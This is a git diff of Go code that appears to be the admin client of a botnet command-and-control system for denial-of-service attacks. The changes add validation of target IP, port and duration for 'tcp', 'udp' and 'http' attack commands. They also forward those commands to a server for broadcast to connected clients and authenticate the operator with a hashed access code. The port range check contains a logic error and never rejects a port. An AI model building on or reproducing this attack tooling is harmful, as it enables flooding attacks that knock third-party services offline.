@@ -12,11 +12,13 @@ import (
 	"time"
 
 	"github.com/joho/godotenv"
+	//"github.com/joho/godotenv"
 )
 
 var (
 	broadcast = make(chan string) // Channel for broadcasting messages
 	conn      net.Conn
+	Secret    string
 )
 
 func hashMessage(message string) string {
@@ -37,7 +39,20 @@ func validateAttackParameters(parameters []string) error {
 		return fmt.Errorf("Custom error: %s", "not enough parameters")
 	}
 
-	_, err := strconv.Atoi(parameters[3])
+	parsedIP := net.ParseIP(parameters[1])
+	if parsedIP == nil {
+		return fmt.Errorf("Invalid IP Address")
+	}
+
+	port, err := strconv.Atoi(parameters[2])
+	if err != nil {
+		return fmt.Errorf("failed to convert port to integer: %v", err)
+	}
+	if port < 1 && port > 65535 {
+		return fmt.Errorf("Invalid Port")
+	}
+
+	_, err = strconv.Atoi(parameters[3])
 	if err != nil {
 		return fmt.Errorf("failed to convert secs to integer: %v", err)
 	}
@@ -73,14 +88,17 @@ func main() {
 	}
 
 	// Access environment variables
-	SECRET := os.Getenv("SECRET")
+	//SECRET := os.Getenv("SECRET")
 	//dbPort := os.Getenv("DB_PORT")
 
-	fmt.Println("Database Host:", SECRET)
+	//fmt.Println("Database Host:", SECRET)
 	//fmt.Println("DatabaclientSecret := credentials[1]se Port:", dbPort)
 
 	//Connect to the server
 	serverAddr := "127.0.0.1:8080"
+
+	fmt.Print("Access Code: ")
+	fmt.Scanln(&Secret)
 
 	go sendMessage()
 
@@ -109,20 +127,27 @@ func main() {
 				fmt.Println("	command 4")
 
 			case "show":
-				fmt.Printf("Number of connected clients: %v\n", 0)
+
 				_, err := conn.Write([]byte("show")) //Sends message to clients
+				fmt.Printf("Number of connected clients: %v\n", 0)
 				if err != nil {
 					fmt.Println("Error broadcasting data:", err)
+
 					continue
 				}
 
 			case "tcp", "udp", "http":
 				err = validateAttackParameters(parameters)
 				if err != nil {
-					fmt.Println("attack not validated", err)
+					fmt.Println("Attack Not Validated: ", err)
 					continue
 				}
 				fmt.Println(parameters)
+				_, err = conn.Write([]byte(strings.Join(parameters, " ")))
+				if err != nil {
+					fmt.Println("Error broadcasting data:", err)
+					continue
+				}
 			case "":
 				continue
 
@@ -157,8 +182,7 @@ func main() {
 				return
 			}
 			//TODO: como admin mandar un mensaje de autenticación
-
-			_, err = conn.Write([]byte(hashMessage(SECRET)))
+			_, err = conn.Write([]byte(hashMessage(Secret)))
 			if err != nil {
 				fmt.Println("Error sending:", err)
 				return
